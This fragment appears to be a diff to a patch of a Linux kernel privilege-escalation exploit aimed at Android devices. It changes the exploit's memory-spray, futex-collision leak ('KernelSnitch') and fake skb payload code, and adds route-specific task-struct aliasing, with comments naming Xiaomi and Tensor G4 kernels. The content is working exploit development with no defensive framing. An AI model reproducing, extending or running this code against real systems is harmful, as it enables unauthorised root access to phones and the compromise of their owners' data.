@@ -27,7 +27,7 @@ index 9a651ab..b37df58 100644
 +  run_exploit(0, NULL);
 +}
 diff --git a/src/core/util.c b/src/core/util.c
-index 199ad42..c87f097 100644
+index 199ad42..611f836 100644
 --- a/src/core/util.c
 +++ b/src/core/util.c
 @@ -318,7 +318,7 @@ int clone_memfd(void) {
@@ -39,7 +39,24 @@ index 199ad42..c87f097 100644
    prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
    prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
  
-@@ -483,11 +483,13 @@ uintptr_t prepare_kernel_page(void) {
+@@ -371,9 +371,13 @@ int prepare_skb_payload(uintptr_t base) {
+   uintptr_t write_pc = fake_parent;
+   uintptr_t write_right = fake_right;
+   uintptr_t write_left = fake_left;
+-  uint64_t waiter_task = INIT_TASK;
+-  uint64_t task_group = ROOT_TASK_GROUP;
+-  uint64_t pi_top_task = INIT_TASK;
++  /* Route-conditional task view (v21): pselect/QCOM keeps the kernel-image
++   * view (proven by C-experiment on Xiaomi 17); tcp/Tensor (6.1, incl.
++   * 6.1.162 Tensor G4 needing dereferenceable aliases per upstream 9e750039)
++   * uses direct-map aliases. */
++  uint64_t waiter_task = tcp ? SLIDE_INIT_TASK : INIT_TASK;
++  uint64_t task_group = tcp ? SLIDE_ROOT_TASK_GROUP : ROOT_TASK_GROUP;
++  uint64_t pi_top_task = tcp ? SLIDE_INIT_TASK : INIT_TASK;
+ 
+   int compact = active_offsets && active_offsets->compact_waiter;
+ 
+@@ -483,11 +487,13 @@ uintptr_t prepare_kernel_page(void) {
    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
      prepare_ctx.childs[i] = clone_child();
      prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
@@ -53,7 +70,7 @@ index 199ad42..c87f097 100644
    }
  
    int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-@@ -521,6 +523,11 @@ uintptr_t prepare_kernel_page(void) {
+@@ -521,6 +527,11 @@ uintptr_t prepare_kernel_page(void) {
    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
      kill_child(spray_ctx.childs[i]);
    }
@@ -65,7 +82,7 @@ index 199ad42..c87f097 100644
    pr_info("[spray] finding futex collisions... +%lldms\n",
            ms_since(&t_spray));
    {
-@@ -569,9 +576,6 @@ uintptr_t prepare_kernel_page(void) {
+@@ -569,9 +580,6 @@ uintptr_t prepare_kernel_page(void) {
      pr_warning("[spray] futex collisions not found\n");
      kernelsnitch_cleanup(ks);
      ks = NULL;
@@ -75,7 +92,7 @@ index 199ad42..c87f097 100644
      cleanup_page_prepare_state();
      return 0;
    }
-@@ -592,9 +596,6 @@ uintptr_t prepare_kernel_page(void) {
+@@ -592,9 +600,6 @@ uintptr_t prepare_kernel_page(void) {
      pr_warning("KernelSnitch mm_struct leak failed\n");
      kernelsnitch_cleanup(ks);
      ks = NULL;
@@ -85,7 +102,7 @@ index 199ad42..c87f097 100644
      cleanup_page_prepare_state();
      return 0;
    }
-@@ -603,9 +604,6 @@ uintptr_t prepare_kernel_page(void) {
+@@ -603,9 +608,6 @@ uintptr_t prepare_kernel_page(void) {
    if (!prepare_skb_payload(base)) {
      kernelsnitch_cleanup(ks);
      ks = NULL;
@@ -95,7 +112,7 @@ index 199ad42..c87f097 100644
      cleanup_page_prepare_state();
      return 0;
    }
-@@ -669,12 +667,6 @@ uintptr_t prepare_kernel_page(void) {
+@@ -669,12 +671,6 @@ uintptr_t prepare_kernel_page(void) {
    kernelsnitch_cleanup(ks);
    ks = NULL;
  
